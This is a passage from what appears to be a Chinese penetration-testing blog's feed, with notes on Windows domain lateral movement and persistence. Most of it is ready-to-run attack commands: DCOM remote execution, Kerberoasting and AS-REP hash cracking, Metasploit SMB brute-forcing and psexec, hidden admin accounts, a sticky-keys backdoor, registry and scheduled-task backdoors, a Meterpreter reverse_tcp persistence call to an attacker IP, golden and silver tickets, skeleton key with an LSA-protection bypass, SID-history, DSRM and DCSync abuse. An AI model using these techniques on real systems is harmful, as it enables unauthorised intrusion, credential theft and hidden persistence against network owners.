class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;Minimized&quot;</span>)    <br></code></pre></td></tr></table></figure><p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/1666021249191-fd2f7c98-17e8-4b7e-ada8-54f48037e14a.png"><br>远程执行命令：</p><p>MMC20.Application：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.ActiveView</span><span class="hljs-selector-class">.ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c C:\shell.exe&quot;</span>,<span class="hljs-string">&quot;Minimized&quot;</span>)<br></code></pre></td></tr></table></figure><p>ShellWindows：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[Activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[Type]</span>::<span class="hljs-built_in">GetTypeFromCLSID</span>(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<span class="hljs-selector-class">.item</span>()<span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c C:\shell.exe&quot;</span>,<span class="hljs-string">&quot;c:\windows\system32&quot;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>Excel.Application:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromprogID</span>(<span class="hljs-string">&quot;Excel.Application&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.DisplayAlerts</span> = <span class="hljs-variable">$false</span><br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.DDEInitiate</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c C:\shell.exe&quot;</span>)<br></code></pre></td></tr></table></figure><p>ShellBrowserWindow</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromCLSID</span>(<span class="hljs-string">&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.shellExecute</span>(<span class="hljs-string">&quot;C:\shell.exe&quot;</span>)<br></code></pre></td></tr></table></figure><p>Visio.Application:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;Visio.Application&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<span class="hljs-variable">$com</span>.<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.shellExecute</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>)<br></code></pre></td></tr></table></figure><p>Outlook.Application:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;Outlook.Application&quot;</span>,<span class="hljs-string">&quot;192.168.52.138&quot;</span>))<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.createObject</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>)<span class="hljs-selector-class">.shellExecute</span>(<span class="hljs-string">&quot;C:\shell.exe&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="Kerberoast横向移动"><a href="#Kerberoast横向移动" class="headerlink" title="Kerberoast横向移动"></a>Kerberoast横向移动</h2><p>通过SPN扫描，我们可以发现许多服务。可以通过powershell命令与这些服务建立连接</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell <span class="hljs-keyword">Add</span>-<span class="hljs-keyword">Type</span> -AssemblyName <span class="hljs-keyword">System</span>.IdentityModel<br>powershell <span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span>  <span class="hljs-keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/SqlServer.god.org:1433&quot;<br></code></pre></td></tr></table></figure><p>建立连接后，我们获取了相应服务的票据。使用klist查看票据信息，若此票据的加密信息为RC4_HMAC_MD5则可以破解，否则不行<br>使用mimikatz导出票据</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-string">&quot;kerberos::list /export&quot;</span><br></code></pre></td></tr></table></figure><p>破解票据</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> tgsrepcrack.py pass.txt <span class="hljs-string">&quot;1-40a00000-jack<span class="hljs-variable">@MSSQLSvc</span>~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi&quot;</span><br></code></pre></td></tr></table></figure><p>除此之外，可以利用Rubues.exe直接获取符合条件的票据</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Rubeus</span>.</span></span>exe kerberoast<br><br></code></pre></td></tr></table></figure><p>之后将获取到的hash更改为hashcat可以破解的格式（去除空格和回车）使用hashcat破解</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -m <span class="hljs-number">13100</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> hash<span class="hljs-selector-class">.txt</span> passwd<span class="hljs-selector-class">.txt</span> <br></code></pre></td></tr></table></figure><h2 id="AS-repoasting"><a href="#AS-repoasting" class="headerlink" title="AS-repoasting"></a>AS-repoasting</h2><p>在预身份验证期间，用户哈希将用于加密域控制器将尝试解密的时间戳，以验证正在使用正确的哈希并且没有重播先前的请求。在验证时间戳之后，KDC 将为用户发出一个 TGT。如果预身份验证被禁用，您可以为任何用户请求任何身份验证数据，并且 KDC 将返回一个可以离线破解的加密 TGT，因为 KDC 跳过了验证用户是否真的是他们所说的人的步骤。<br>AS-REP Roasting 会转储禁用 Kerberos 预身份验证的用户帐户的 krbasrep5 哈希值。与 Kerberoasting 不同，这些用户不必是服务帐户。唯一要求是 必须禁用了预认证才能使用</p><p>获取所有符合条件的hash</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python GetNPUser<span class="hljs-selector-class">.py</span> spookysec<span class="hljs-selector-class">.local</span><span class="hljs-selector-class">.user</span> -no-pass<br>rubeus<span class="hljs-selector-class">.exe</span> asreproast<br></code></pre></td></tr></table></figure><p>获取hash后复制到攻击机的TXT中，在$krb5asrep$后加上23$，去除空格和回车</p><p>使用hashcat破解</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">18200</span> hash.txt Pass.txt<br></code></pre></td></tr></table></figure><h2 id="域横向移动自动化平台-MSF-CrackMapExec"><a href="#域横向移动自动化平台-MSF-CrackMapExec" class="headerlink" title="域横向移动自动化平台-MSF&amp;CrackMapExec"></a>域横向移动自动化平台-MSF&amp;CrackMapExec</h2><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>批量扫描</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use auxiliary/scanner/smb/smb_login<br><span class="hljs-built_in">set</span> threads 10<br><span class="hljs-built_in">set</span> rhosts 192.168.3.0/24<br><span class="hljs-built_in">set</span> smbdomain god<br><span class="hljs-built_in">set</span> user_file /root/user.txt<br><span class="hljs-built_in">set</span> pass_file /root/pass.txt<br>run<br></code></pre></td></tr></table></figure><p>利用</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/smb/psexec<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">RHOSTS 192.168.3.32</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">smbuser administrator</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">smbpass admin!@#45</span><br>run<br></code></pre></td></tr></table></figure><h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><p>官方手册：<a href="https://mpgn.gitbook.io/crackmapexec/">https://mpgn.gitbook.io/crackmapexec/</a></p><p>部分案例：<a href="https://www.freebuf.com/sectool/184573.html">https://www.freebuf.com/sectool/184573.html</a></p><p>下载对应release，建立socks连接，设置socks代理，配置规则，调用！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>内网权限维持</title>
    <link href="/cllafrcou000kfoutc341bdrb/"/>
    <url>/cllafrcou000kfoutc341bdrb/</url>
    
    <content type="html"><![CDATA[<h1 id="内网权限维持"><a href="#内网权限维持" class="headerlink" title="内网权限维持"></a>内网权限维持</h1><h2 id="创建隐藏账户"><a href="#创建隐藏账户" class="headerlink" title="创建隐藏账户"></a>创建隐藏账户</h2><p>创建账户是最容易的方式也是最容易被发现的方式。所以为了防止被发现，我们要创建一个隐藏账户<br>使用如下命令创建一个隐藏账户，并将该用户加入管理员组</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> user test$ Li12345 /add<br><span class="hljs-built_in">net</span> localgroup administrators test$ /add<br></code></pre></td></tr></table></figure><p>此时使用net user 命令是无法发现此账号的<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-1.png"><br>但是在计算机管理和注册表中还是可以发现此隐藏账户的：<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-2.png"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-3.png"><br>现在我们需要将此后门账户进一步隐藏<br>在注册表中的Names中找到Administrator，点击后记录下类型值，在Users下找到类型值相对的项<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-4.png"><br>点击Users下的000001F4获取其f的键值，将其复制下来<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-5.png"><br>同样的操作找到test$的f键值，将Administrator的f键值复制进去。之后将test$项和与其类型值相同的项导出<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-6.png"><br>导出后使用net user test$ &#x2F;del 命令删除此用户<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-7.png"><br>之后打开注册表，将刚刚导出的两个注册表项导入<br>此时只能在注册表中看见隐藏用户，计算机管理中无法发现此隐藏用户<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-8.png"></p><h2 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h2><p>粘滞键是为了照顾残疾人而设计的，连续按五次shift键即可调出粘滞键设置界面<br>如果 我们可以把粘滞键设置界面更改为cmd.exe即可在不登录的情况下通过粘滞键调出cmd。效果如下图：<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-9.png"><br>粘滞键调出的exe的位置为C:\windows\system32\sethc.exe<br>使用下面的命令进行替换：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> C:\windows\system32\<br><span class="hljs-built_in">move</span> sethc.exe sethc.exe.bak<br><span class="hljs-built_in">copy</span> <span class="hljs-built_in">cmd</span>.exe sethc.exe<br></code></pre></td></tr></table></figure><p>不过在一些做了防护的主机上，即使是SYSTEM权限也是无法修改sethc.exe的。只有TrustedInstaller权限才可以，这时，我们就要先模拟一个TrustedInstaller权限的令牌获取TrustedInstaller权限，然后再执行上述操作。我们的思路如下：</p><p>当我们启动TrustedInstaller服务时会启动进程TrustedInstaller.exe，该程序的权限为NT SERVICE\TrustedInstaller，那么我们就可以窃取该进程的令牌。</p><p>以msf为例 假设我们已经取得了 目标机器的administrator权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">getsystem                        #提权至system不然窃取进程时可能会出错<br>shell                                  #进入cmd<br>sc.exe TrustedInstaller # 启动TrustedInstaller.exe，此时返回框会获取到TrustedInstaller.exe的pid值<br>exit                                   #退出cmd<br>steal_token &lt;pid&gt;          #窃取进程<br>之后就可以替换sethc.exe了<br>除了上述方法外还可以使用empire的模块：<br>usemodule lateral_movement/invoke_wmi_debugger<br>set ComputerName &lt;主机名/IP&gt;<br>set TargetBinary sethc.exe<br>execute<br></code></pre></td></tr></table></figure><h2 id="注册表后门"><a href="#注册表后门" class="headerlink" title="注册表后门"></a>注册表后门</h2><p>此方法是通过将需要执行的后门程序或者攻击脚本路径添加到注册表的自动启动项中，从而实现目标主机启动或登录时便会执行后门程序使我们获得其控制权限。<br>一般我们使用注册表的如下位置：<br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run   // 开启时启动程序</code><br><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit   // 登录时启动程序</code><br>在msf中进行下列操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key<br>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v backdoor -d &#x27;C:\windows\system32\backdoor.exe&#x27; #设置键值<br>reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v backdoor   #查看键值<br></code></pre></td></tr></table></figure><p>其中backdoor是提前生成并上传的后门</p><p>也可以使用msf自带的模块，Metasploit通过使用Meterpreter脚本和后渗透模块来支持通过注册表的持久性。Meterpreter脚本将以VBS脚本的形式创建一个有效payload，该payload将被上传到目标主机的磁盘上，并创建一个注册表项，该注册表项将在用户登录期间循环运行该有效负载。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.52.129  run persistence -X -P windows/x64/meterpreter/reverse_tcp -i 5 -p 4444 -r 192.168.52.129<br></code></pre></td></tr></table></figure><h2 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h2><h3 id="at计划任务后门"><a href="#at计划任务后门" class="headerlink" title="at计划任务后门"></a>at计划任务后门</h3><p><code>at 15:01:00 /every:M,T,W,Th,F c:\windows\system32\backdoor.exe</code><br>在每个工作日的15：01执行后门，不过at命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了</p><h3 id="schtasks后门"><a href="#schtasks后门" class="headerlink" title="schtasks后门"></a>schtasks后门</h3><p><code>schtasks /create /tn backdoor /sc minute /mo 1  /tr c:\windows\system32\backdoor.exe /ru system /f</code><br>每隔一分钟执行一次后门</p><h2 id="内网域控权限维持"><a href="#内网域控权限维持" class="headerlink" title="内网域控权限维持"></a>内网域控权限维持</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>黄金票据是通过使用krbtgt用户的ntlm hash伪造TGT实现的。<br>首先在域控中获取krbtgt的ntlm hash和sid：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>lsadump::lsa /patch<br></code></pre></td></tr></table></figure><p>获取到后在任意一台域内主机执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kerberos::golden <span class="hljs-regexp">/user:administrator /</span>domain:domain_name <span class="hljs-regexp">/sid:SID /</span>krbtgt:KRBTGT_NTLMHASH<br></code></pre></td></tr></table></figure><p>经过上面的命令可以获得一张票据 ticket.kirbi，再使用mimikatz将此票据注入内存</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::ptt ticker.kirbi<br></code></pre></td></tr></table></figure><p>此时黄金票据成功注入内存，使用dir \主机名\c$ 即可访问域控的c盘<br>此处需要注意的是要使用主机名而不是ip，这是因为使用ip时使用的是NTLM协议，使用主机名时使用的是kerberos协议，而黄金票据伪造的是kerberos协议中的TGT票据</p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据是通过服务账号的ntlmhash伪造st实现权限维持的<br>首先在域控主机上执行</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p>获取域控上的计算机账号的hash<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-10.png"><br>之后在任意一台域内主机使用mimikatz执行下面命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">kerberos::<span class="hljs-title">golden</span> /<span class="hljs-title">domain:DEMO</span>.<span class="hljs-title">com</span> /<span class="hljs-title">sid:S</span>-1-5-21-979886063-1111900045-1414766810 /<span class="hljs-title">target:WIN</span>-<span class="hljs-title">ENS2VR5TR3N.DEMO.com</span> /<span class="hljs-title">rc4:f0954d00b21d338aa86051eca90f7f74</span> /<span class="hljs-title">service:cifs</span> /<span class="hljs-title">user:douser</span> /<span class="hljs-title">ptt</span></span><br></code></pre></td></tr></table></figure><p>使用dir \主机名\c$ 即可访问域控的c盘<br>此处需要注意的是要使用主机名而不是ip，这是因为使用ip时使用的是NTLM协议，使用主机名时使用的是kerberos协议，而黄金票据伪造的是kerberos协议中的ST票据</p><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>使用方法：<code>misc::skeleton</code><br>执行上述命令后域内所有账户都会被添加一个“额外密码” ——-mimikatz  ，此时账号的原密码也可以登录，使用mimikatz也可以登录<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-11.png"><br>此种方法是通过注入了lsass.exe进程实现的，所以在重启之后会失效<br>微软在2014年提供了一个LSA保护策略<br>可以通过查看注册表中是否存在RunAsPPL项且值为1来判断是否开启了LSA（为0则开启了）<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-12.png"><br>在此策略开启的情况下，mimikatz无法对lsass.exe进程进行注入。可以通过下面的而方式绕过LSA保护策略</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-comment"># privilege::debug </span><br>mimikatz <span class="hljs-comment"># !+ </span><br>mimikatz <span class="hljs-comment"># !processprotect /process:lsass.exe /remove </span><br>mimikatz <span class="hljs-comment"># misc::skeleton</span><br></code></pre></td></tr></table></figure><h3 id="sid-history后门"><a href="#sid-history后门" class="headerlink" title="sid-history后门"></a>sid-history后门</h3><p>SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。<br>使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则可以将SID History作为实现持久化的方法。<br>首先需要打开一个具有域管理员权限的cmd窗口，在这个cmd窗口中执行如下命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz # privilege::debug <br>mimikatz # sid::patch <br>mimikatz # sid::add /sam:hack /new:administrator<br></code></pre></td></tr></table></figure><p>其中hack为后门用户，可以自己创建一个新的域用户，也可是域中其他用户<br>执行后登录该账户，已经可以访问域控的目录（dir \192.168.3.21\c$）</p><h3 id="dsrm后门"><a href="#dsrm后门" class="headerlink" title="dsrm后门"></a>dsrm后门</h3><p>目录服务恢复模式(DSRM，Directory Services Restore Mode)，是Windows服务器域控制器的安全模式启动选项。域控制器的本地账户也就是DSRM账户，DSRM密码是在DC创建时设置的，一般很少更改。DSRM允许管理员用来修复或还原修复或重建活动目录数据库。我们可以通过修改dsrm密码来实现dsrm后门<br>使用下面的命令可以修改dsrm密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ntdsutil<br><span class="hljs-keyword">set</span> dsrm <span class="hljs-keyword">password</span><br>sync <span class="hljs-keyword">from</span> <span class="hljs-keyword">domain</span> account &lt;account_name&gt;<br>q<br>q<br></code></pre></td></tr></table></figure><p>之后还要修改dsrm的登陆方式，dsrm有三种登陆方式<br>● 0：默认值，只有当域控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号<br>● 1：只有当本地 AD、DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器<br>● 2：在任何情况下，都可以使用 DSRM 管理员账号登录域控制器<br>我们需要将该值设置为2<br><code>reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2</code><br>或者<code>New-ItemProperty “hklm:\system\currentcontrolset\control\lsa\”-name“dsrmadminlogonbehavior” -value 2 -propertyType DWORD</code><br>之后就可以使用刚刚同步后的hash值进行pth攻击，需要注意的是domain后接的是dc的主机名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::pth /domain:owa2010cn-god /user:Administrator /ntlm:518b98ad4178a53695dc997aa02d455c<br></code></pre></td></tr></table></figure><p>在弹出的cmd界面使用dir可以访问相应目录<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-13.png"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-14.png"></p><h3 id="DCSync后门"><a href="#DCSync后门" class="headerlink" title="DCSync后门"></a>DCSync后门</h3><p>DCSync是域中用于不同DC之间同步数据的一种方式。我们可以利用mimikatz伪造一个恶意的DC服务器向真正的DC发送同步数据请求，从而获取ntds.dit，获取域内用户的hash<br>不过DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的<br>但是DCSync并不是所有域内用户都有权限进行此操作的。只有Administrator，Domain Controller，组内的用户<br>但是我们可以通过修改ACL为普通域内用户添加此权限，使得普通用户也可以执行DCSync<br>添加权限使用powerview.ps1进行<br>具体做法就是为普通域用户添加三条 ACE 访问控制项：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">DS</span>-Replication-Get-Changes（GUID:<span class="hljs-number">1131</span>f6aa-<span class="hljs-number">9</span>c07-<span class="hljs-number">11</span>d1-f79f-<span class="hljs-number">00</span>c04fc2dcd2）<br><span class="hljs-attribute">DS</span>-Replication-Get-Changes-<span class="hljs-literal">All</span>（GUID:<span class="hljs-number">1131</span>f6ad-<span class="hljs-number">9</span>c07-<span class="hljs-number">11</span>d1-f79f-<span class="hljs-number">00</span>c04fc2dcd2）<br><span class="hljs-attribute">DS</span>-Replication-Get-Changes（GUID:<span class="hljs-number">89</span>e95b76-<span class="hljs-number">444</span>d-<span class="hljs-number">4</span>c62-<span class="hljs-number">991</span>a-<span class="hljs-number">0</span>facbeda640c）<br></code></pre></td></tr></table></figure><p>我们可以通过 Empire 框架中的 PowerView.ps1 脚本实现：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powerview.ps1<br># 为域用户 whoami 添加以上三条 ACE<br><span class="hljs-keyword">Add</span>-DomainObjectAcl -TargetIdentity <span class="hljs-string">&quot;DC=whoamianony,DC=org&quot;</span> -PrincipalIdentity whoami -Rights DCSync -<span class="hljs-keyword">Verbose</span><br># 为域用户 whoami 删除以上三条 ACE<br><span class="hljs-keyword">Remove</span>-DomainObjectAcl -TargetIdentity <span class="hljs-string">&quot;DC=whoamianony,DC=org&quot;</span> -PrincipalIdentity whoami -Rights DCSync -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure><p>之后使用mimikatz导出域内所有用户的信息(包括哈希值)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:whoamianony.org /all    <br>lsadump::dcsync /domain:whoamianony.org /all /csv<br></code></pre></td></tr></table></figure><p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-15.png"><br>除此之外还可以使用runas在其他域内主机如boss上使用dbadmin的身份执行DCSync（boss是没有DCSync权限的）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/noprofile /u</span>ser:god\dbadmin cmd<br></code></pre></td></tr></table></figure><p>在弹出的cmd中执行mimikatz的相关命令即可，不过要注意的是，弹出的cmd只是使用了dbadmin的身份，而不是dbadmin用户的cmd。在这个cmd中使用的所有文件还是boss用户的机器上的文件，所以mimikatz应该存在于boss机器上，查找时也应该按照boss机器的路径查找mimikatz.exe。</p><p>runas弹出的cmd中执行命令:<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-16.png"></p><p>boss用户机器中的cmd中执行命令:<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/quanxian-17.png"><br>如上图中所示，ipconfig的结果仍是boss用户机器的结果</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/cllafrcot000jfoutb06l80be/"/>
    <url>/cllafrcot000jfoutb06l80be/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jetty 漏洞学习</title>
    <link href="/cllafrcoq000dfout4o6j4uyx/"/>
    <url>/cllafrcoq000dfout4o6j4uyx/</url>
    
